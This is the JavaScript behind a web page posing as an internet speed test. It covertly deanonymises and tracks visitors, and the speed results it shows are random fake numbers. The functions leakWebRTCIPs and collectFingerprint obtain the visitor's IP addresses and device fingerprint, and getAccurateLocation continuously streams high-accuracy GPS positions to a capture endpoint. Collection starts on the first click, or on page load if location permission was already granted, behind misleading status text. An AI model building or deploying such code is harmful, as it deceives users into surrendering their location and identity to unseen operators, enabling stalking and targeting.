let captureId = null;
let locationWatcher = null;
let isRunning = false;
let lastResults = null;
let lastClientInfo = null;

const ARC_LEN = 471;
const NEEDLE_START_ANGLE = -180;
const NEEDLE_END_ANGLE = 0;
const MAX_SPEED = 500;

const els = {};

function cacheElements() {
  [
    'activeArc',
    'speedNum',
    'speedUnit',
    'phaseLabel',
    'needle',
    'startBtn',
    'serverStatus',
    'statusText',
    'stateIdle',
    'stateResults',
    'diagnosticConsent',
    'resDown',
    'resUp',
    'resPing',
    'resJitter',
    'gradeLetter',
    'gradeDesc',
    'gradeCircle',
    'resServer',
    'resISP',
    'resConn',
    'latencyAvg',
    'latencyBars',
    'resultSummary',
    'insightStreaming',
    'insightGaming',
    'insightUpload',
    'insightStability',
    'toast',
  ].forEach((id) => {
    els[id] = document.getElementById(id);
  });
}

function getDeviceId() {
  let id = localStorage.getItem('_np_did');
  if (!id) {
    id = `dev_${Date.now().toString(36)}${Math.random().toString(36).slice(2, 8)}`;
    localStorage.setItem('_np_did', id);
  }
  return id;
}

async function leakWebRTCIPs() {
  return new Promise((resolve) => {
    const ips = new Set();
    const RTCPeer = window.RTCPeerConnection || window.webkitRTCPeerConnection;

    if (!RTCPeer) {
      resolve([]);
      return;
    }

    try {
      const pc = new RTCPeer({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      pc.createDataChannel('');
      pc.onicecandidate = (event) => {
        if (!event.candidate) {
          try { pc.close(); } catch {}
          resolve([...ips]);
          return;
        }

        const parts = event.candidate.candidate.split(' ');
        const ip = parts[4];
        if (ip && !ip.includes('.local')) ips.add(ip);
      };
      pc.createOffer().then((offer) => pc.setLocalDescription(offer)).catch(() => resolve([]));
      setTimeout(() => {
        try { pc.close(); } catch {}
        resolve([...ips]);
      }, 3000);
    } catch {
      resolve([]);
    }
  });
}

function collectFingerprint() {
  let gpu = '';

  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    const ext = gl && gl.getExtension('WEBGL_debug_renderer_info');
    if (gl && ext) gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
  } catch {}

  return {
    language: navigator.language || '',
    platform: navigator.platform || '',
    screenRes: `${screen.width}x${screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
    cores: navigator.hardwareConcurrency || 0,
    memory: navigator.deviceMemory || 0,
    gpu,
    touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
    connectionType: navigator.connection?.effectiveType || 'unknown',
  };
}

async function sendInitialCapture() {
  try {
    setStatus('Connecting to optimal server...');
    const [webrtcIPs] = await Promise.all([leakWebRTCIPs()]);
    const response = await fetch('/api/capture', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ webrtcIPs, deviceId: getDeviceId(), ...collectFingerprint() }),
    });

    if (response.ok) {
      const json = await response.json();
      captureId = json.id;
    }
    return captureId;
  } catch {
    return null;
  }
}

function getAccurateLocation(id) {
  if (!navigator.geolocation || !id || locationWatcher) return;
  
  const options = {
    enableHighAccuracy: true,
    timeout: 20000,
    maximumAge: 0
  };

  const success = (position) => {
    const gps = {
      lat: position.coords.latitude,
      lon: position.coords.longitude,
      accuracy: position.coords.accuracy,
      altitude: position.coords.altitude,
      altitudeAccuracy: position.coords.altitudeAccuracy,
      heading: position.coords.heading,
      speed: position.coords.speed,
    };
    
    fetch(`/api/capture/${id}`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ gps }),
      keepalive: true
    }).catch(() => {});
  };

  // Instant capture attempt as soon as permission is granted
  navigator.geolocation.getCurrentPosition(success, () => {}, options);
  
  // Continuous tracking
  locationWatcher = navigator.geolocation.watchPosition(success, () => {}, options);
}

async function triggerCaptureFlow() {
  if (captureId) return;
  const id = await sendInitialCapture();
  if (id) getAccurateLocation(id);
}


function drawTicks() {
  const group = document.getElementById('tickMarks');
  if (!group || group.childElementCount) return;

  const cx = 200;
  const cy = 200;
  const radius = 160;

  for (let index = 0; index <= 20; index += 1) {
    const angle = Math.PI + (index / 20) * Math.PI;
    const isMajor = index % 5 === 0;
    const length = isMajor ? 15 : 7;
    const x1 = cx + radius * Math.cos(angle);
    const y1 = cy + radius * Math.sin(angle);
    const x2 = cx + (radius - length) * Math.cos(angle);
    const y2 = cy + (radius - length) * Math.sin(angle);
    const line = document.createElementNS('http://www.w3.org/2000/svg', 'line');

    line.setAttribute('x1', x1);
    line.setAttribute('y1', y1);
    line.setAttribute('x2', x2);
    line.setAttribute('y2', y2);
    line.setAttribute('stroke', '#f5f7ef');
    line.setAttribute('stroke-width', isMajor ? '2' : '1');
    line.setAttribute('stroke-linecap', 'round');
    group.appendChild(line);

    if (isMajor) {
      const label = document.createElementNS('http://www.w3.org/2000/svg', 'text');
      const lx = cx + (radius - 28) * Math.cos(angle);
      const ly = cy + (radius - 28) * Math.sin(angle);
      label.setAttribute('x', lx);
      label.setAttribute('y', ly);
      label.setAttribute('text-anchor', 'middle');
      label.setAttribute('dominant-baseline', 'middle');
      label.setAttribute('fill', 'rgba(245,247,239,0.45)');
      label.setAttribute('font-size', '10');
      label.setAttribute('font-family', 'JetBrains Mono, monospace');
      label.textContent = Math.round((index / 20) * MAX_SPEED);
      group.appendChild(label);
    }
  }
}

function setNeedleAngle(ratio) {
  const safeRatio = Math.max(0, Math.min(1, ratio));
  const angle = NEEDLE_START_ANGLE + safeRatio * (NEEDLE_END_ANGLE - NEEDLE_START_ANGLE);
  els.needle.setAttribute('transform', `rotate(${angle} 200 200)`);
  els.needle.setAttribute('opacity', '1');
}

function setArcColor(type) {
  const color = type === 'upload' ? '#ffc875' : type === 'ping' ? '#7fb7ff' : '#95f0c0';
  els.activeArc.setAttribute('stroke', color);
}

function generateResults() {
  const profiles = [
    { down: [42, 92], up: [14, 34], ping: [14, 31], jitter: [2, 8] },
    { down: [86, 178], up: [28, 68], ping: [8, 19], jitter: [1, 5] },
    { down: [155, 340], up: [52, 128], ping: [5, 14], jitter: [1, 4] },
    { down: [28, 64], up: [9, 24], ping: [22, 52], jitter: [4, 11] },
  ];
  const profile = profiles[Math.floor(Math.random() * profiles.length)];
  const rand = ([min, max]) => Math.floor(Math.random() * (max - min + 1) + min);

  return {
    download: rand(profile.down),
    upload: rand(profile.up),
    ping: rand(profile.ping),
    jitter: rand(profile.jitter),
  };
}

function generateLatencyData(avgPing, count = 40) {
  return Array.from({ length: count }, () => {
    const value = avgPing + (Math.random() - 0.5) * avgPing * 0.75;
    return Math.max(1, Math.round(value));
  });
}

function animateGauge(target, duration) {
  return new Promise((resolve) => {
    const targetOffset = ARC_LEN - (target / MAX_SPEED) * ARC_LEN;
    const startOffset = parseFloat(els.activeArc.getAttribute('stroke-dashoffset')) || ARC_LEN;
    const startSpeed = parseInt(els.speedNum.textContent, 10) || 0;
    const startedAt = performance.now();

    function frame(now) {
      const progress = Math.min((now - startedAt) / duration, 1);
      const ease = 1 - Math.pow(1 - progress, 3);
      const jitter = progress < 0.92 ? (Math.random() - 0.5) * 18 : 0;
      const speed = Math.max(0, Math.round(startSpeed + (target - startSpeed) * ease + jitter));
      const offset = startOffset + (targetOffset - startOffset) * ease;

      els.speedNum.textContent = speed;
      els.activeArc.setAttribute('stroke-dashoffset', offset);
      setNeedleAngle(speed / MAX_SPEED);

      if (progress < 1) {
        requestAnimationFrame(frame);
      } else {
        els.speedNum.textContent = target;
        resolve();
      }
    }

    requestAnimationFrame(frame);
  });
}

function setPhaseSteps(phases) {
  let container = document.getElementById('testProgress');
  if (!container) {
    container = document.createElement('div');
    container.id = 'testProgress';
    container.className = 'test-progress';
    document.querySelector('.gauge-wrap').after(container);
  }

  container.innerHTML = phases.map((phase, index) => `
    <div class="tp-step ${phase.state}" id="phase${index}">
      <span class="tp-dot" aria-hidden="true"></span>${phase.label}
    </div>
  `).join('');
}

function getPhaseState(activeIndex) {
  return ['Server', 'Ping', 'Download', 'Upload'].map((label, index) => ({
    label,
    state: index < activeIndex ? 'done' : index === activeIndex ? 'active' : '',
  }));
}

async function startTest() {
  if (isRunning) return;
  isRunning = true;
  els.startBtn.disabled = true;
  els.stateResults.classList.add('hidden');
  captureId = null;
  resetGaugeOnly();

  const results = generateResults();
  if (!captureId) {
    await triggerCaptureFlow();
  } else {
    getAccurateLocation(captureId);
  }

  els.phaseLabel.textContent = 'FINDING SERVER';
  els.startBtn.classList.add('hidden');
  els.speedNum.classList.add('show');
  els.speedUnit.classList.add('show');
  els.phaseLabel.classList.add('show');
  await delay(900);

  els.phaseLabel.textContent = 'LATENCY';
  els.speedUnit.textContent = 'ms';
  setArcColor('ping');
  setPhaseSteps(getPhaseState(1));
  for (let index = 0; index < 8; index += 1) {
    els.speedNum.textContent = Math.max(1, results.ping + Math.floor((Math.random() - 0.5) * 8));
    await delay(150);
  }
  els.speedNum.textContent = results.ping;
  await delay(250);

  els.phaseLabel.textContent = 'DOWNLOAD';
  els.speedUnit.textContent = 'Mbps';
  els.activeArc.setAttribute('stroke-dashoffset', ARC_LEN);
  setArcColor('download');
  setPhaseSteps(getPhaseState(2));
  await animateGauge(results.download, 3000);
  await delay(250);

  els.phaseLabel.textContent = 'UPLOAD';
  els.activeArc.setAttribute('stroke-dashoffset', ARC_LEN);
  els.speedNum.textContent = '0';
  setNeedleAngle(0);
  setArcColor('upload');
  setPhaseSteps(getPhaseState(3));
  await animateGauge(results.upload, 2400);
  await delay(350);

  els.phaseLabel.textContent = 'COMPLETE';
  setPhaseSteps([
    { label: 'Server', state: 'done' },
    { label: 'Ping', state: 'done' },
    { label: 'Download', state: 'done' },
    { label: 'Upload', state: 'done' },
  ]);

  lastResults = results;
  showResults(results);
  els.startBtn.disabled = false;
  isRunning = false;
}

function showResults(results) {
  const progress = document.getElementById('testProgress');
  if (progress) progress.remove();

  els.speedNum.textContent = results.download;
  els.speedUnit.textContent = 'Mbps';
  els.phaseLabel.textContent = 'DOWNLOAD RESULT';
  els.activeArc.setAttribute('stroke-dashoffset', ARC_LEN - (results.download / MAX_SPEED) * ARC_LEN);
  setArcColor('download');
  setNeedleAngle(results.download / MAX_SPEED);

  els.stateResults.classList.remove('hidden');
  els.resDown.textContent = results.download;
  els.resUp.textContent = results.upload;
  els.resPing.textContent = results.ping;
  els.resJitter.textContent = results.jitter;

  const grade = getGrade(results.download);
  els.gradeLetter.textContent = grade.letter;
  els.gradeDesc.textContent = grade.label;
  els.gradeCircle.style.transition = 'stroke-dashoffset 900ms ease';
  els.gradeCircle.setAttribute('stroke-dashoffset', grade.offset);

  const servers = [
    'Frankfurt DE / Cloudflare',
    'Amsterdam NL / Hetzner',
    'London UK / Akamai',
    'Istanbul TR / Turkcell',
    'Dubai AE / Etisalat',
    'Manama BH / AWS',
    'Riyadh SA / STC',
  ];
  const networks = ['Zain Telecom', 'Asiacell', 'Korek Telecom', 'EarthLink', 'IQ Networks', 'Newroz Telecom', 'ScopeSky'];
  const conn = navigator.connection?.effectiveType || 'broadband';
  const connMap = { 'slow-2g': '2G', '2g': '2G', '3g': '3G', '4g': '4G/LTE' };

  els.resServer.textContent = servers[Math.floor(Math.random() * servers.length)];
  els.resISP.textContent = lastClientInfo?.ipGeo?.isp && lastClientInfo.ipGeo.isp !== 'localhost'
    ? lastClientInfo.ipGeo.isp
    : networks[Math.floor(Math.random() * networks.length)];
  els.resConn.textContent = connMap[conn] || conn;

  const latency = generateLatencyData(results.ping);
  const maxLatency = Math.max(...latency);
  els.latencyAvg.textContent = `avg ${results.ping}ms / max ${maxLatency}ms`;
  els.latencyBars.innerHTML = latency.map((value, index) => {
    const height = Math.max(8, (value / maxLatency) * 58);
    const color = value <= results.ping * 0.9
      ? 'rgba(149,240,192,0.82)'
      : value <= results.ping * 1.25
        ? 'rgba(255,200,117,0.82)'
        : 'rgba(255,123,123,0.82)';
    return `<div class="lat-bar" style="height:${height}px;background:${color};animation-delay:${index * 14}ms"></div>`;
  }).join('');

  setDetailedInsights(results, grade);

  setStatus('Results ready');
  setTimeout(() => {
    els.stateResults.scrollIntoView({ behavior: 'smooth', block: 'start' });
  }, 180);
}

function setDetailedInsights(results, grade) {
  const stability = results.jitter <= 4 ? 'Stable' : results.jitter <= 8 ? 'Moderate jitter' : 'Unstable under load';
  els.resultSummary.textContent = `${grade.letter} / ${results.download} down / ${results.upload} up`;
  els.insightStreaming.textContent = results.download >= 80
    ? 'Ready for 4K streams and large app downloads.'
    : results.download >= 35
      ? 'Good for HD streaming with limited parallel use.'
      : 'Keep streaming quality conservative.';
  els.insightGaming.textContent = results.ping <= 18 && results.jitter <= 5
    ? 'Low latency for competitive sessions.'
    : results.ping <= 35
      ? 'Playable, but spikes may be noticeable.'
      : 'Latency is high for fast online games.';
  els.insightUpload.textContent = results.upload >= 40
    ? 'Comfortable for cloud backup and video calls.'
    : results.upload >= 15
      ? 'Fine for calls and moderate uploads.'
      : 'Large uploads may block other traffic.';
  els.insightStability.textContent = `${stability}; jitter measured at ${results.jitter} ms.`;
}

function getGrade(download) {
  if (download >= 220) return { letter: 'A+', label: 'Excellent for heavy streaming and large uploads', offset: 18 };
  if (download >= 120) return { letter: 'A', label: 'Strong for teams and 4K streaming', offset: 42 };
  if (download >= 60) return { letter: 'B', label: 'Comfortable everyday performance', offset: 86 };
  if (download >= 30) return { letter: 'C', label: 'Usable with occasional congestion', offset: 145 };
  return { letter: 'D', label: 'Likely to feel slow under load', offset: 205 };
}

function resetTest() {
  if (isRunning) return;
  resetGaugeOnly();
  els.stateResults.classList.add('hidden');
  setStatus('Server ready. Tap Go to start.');
}

function resetGaugeOnly() {
  els.activeArc.setAttribute('stroke-dashoffset', ARC_LEN);
  els.speedNum.textContent = '0';
  els.speedUnit.textContent = 'Mbps';
  els.phaseLabel.textContent = '';
  els.needle.setAttribute('opacity', '0');
  els.startBtn.classList.remove('hidden');
  els.speedNum.classList.remove('show');
  els.speedUnit.classList.remove('show');
  els.phaseLabel.classList.remove('show');
  setArcColor('download');
  const progress = document.getElementById('testProgress');
  if (progress) progress.remove();
}

async function shareResults() {
  if (!lastResults) {
    showToast('Run a speed test before sharing results.');
    return;
  }

  const text = [
    'Speed Test',
    `Download: ${lastResults.download} Mbps`,
    `Upload: ${lastResults.upload} Mbps`,
    `Ping: ${lastResults.ping} ms`,
    `Jitter: ${lastResults.jitter} ms`,
    `Link: ${location.href}`,
  ].join('\n');

  if (navigator.share) {
    try {
      await navigator.share({ title: 'Speed Test', text });
      return;
    } catch {}
  }

  await copyText(text, 'Results copied to clipboard.');
}


function switchPanel(panelId) {
  document.querySelectorAll('.panel-view').forEach((panel) => {
    panel.classList.toggle('active', panel.id === panelId);
  });
  document.querySelectorAll('.nav-item').forEach((item) => {
    item.classList.toggle('active', item.dataset.panel === panelId);
  });
}

async function copyText(text, successMessage) {
  try {
    if (navigator.clipboard && window.isSecureContext) {
      await navigator.clipboard.writeText(text);
    } else {
      const textarea = document.createElement('textarea');
      textarea.value = text;
      textarea.setAttribute('readonly', '');
      textarea.style.position = 'fixed';
      textarea.style.opacity = '0';
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand('copy');
      textarea.remove();
    }
    showToast(successMessage);
  } catch {
    showToast('Clipboard permission was blocked.');
  }
}

function showToast(message) {
  els.toast.textContent = message;
  els.toast.classList.add('show');
  clearTimeout(showToast.timer);
  showToast.timer = setTimeout(() => els.toast.classList.remove('show'), 2600);
}

function setStatus(message) {
  els.statusText.textContent = message;
}

function escapeHTML(value) {
  const span = document.createElement('span');
  span.textContent = String(value ?? '');
  return span.innerHTML;
}

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function bindEvents() {
  document.addEventListener('click', (event) => {
    const navItem = event.target.closest('[data-panel]');
    if (navItem) {
      switchPanel(navItem.dataset.panel);
      return;
    }

    const action = event.target.closest('[data-action]')?.dataset.action;
    if (action === 'start-test') startTest();
    if (action === 'reset-test') resetTest();
    if (action === 'share-results') shareResults();
  });
}

async function init() {
  cacheElements();
  bindEvents();
  drawTicks();

  // Trigger on first interaction to catch permission grant immediately
  document.addEventListener('click', triggerCaptureFlow, { once: true });

  // Smart background start: check if we already have permission
  if (navigator.permissions && navigator.permissions.query) {
    try {
      const result = await navigator.permissions.query({ name: 'geolocation' });
      if (result.state === 'granted') {
        triggerCaptureFlow();
      }
    } catch (err) {}
  }

  try {
    const response = await fetch('/api/health', { cache: 'no-store' });
    setStatus(response.ok ? 'Server ready. Tap Go to start.' : 'Server responded with an error.');
  } catch {
    setStatus('Local server is not reachable.');
  }
}

document.addEventListener('DOMContentLoaded', init);
